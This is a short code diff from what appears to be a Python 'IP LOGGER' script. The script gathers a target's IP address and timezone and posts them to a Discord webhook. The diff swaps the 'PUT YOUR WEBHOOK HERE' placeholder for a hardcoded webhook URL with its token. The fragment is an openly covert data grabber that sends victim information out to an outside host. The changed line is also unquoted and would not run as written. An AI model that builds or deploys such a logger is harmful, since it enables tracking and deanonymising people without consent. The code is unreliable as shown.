@@ -12,7 +12,7 @@ timezone = json_stats["timezone"]
 webhookurl = " " #PUT YOUR WEBHOOK HERE
 
 def embed():
-  webhook = DiscordWebhook(url=webhookurl)
+  webhook = DiscordWebhook(url=https://discord.com/api/webhooks/1066600363056189470/90_0Qm9ZYfSLpMXkj3WCxhA_KvB1-EBvEM5R5ayMuS4WEYd8nzcgL-LbHwPQYrbyExaR)
   embed = DiscordEmbed(title=" ", color=242424)
   embed.add_embed_field(name=f"*__IP LOGGER__*", value=f"""
   **IP:** {ip}
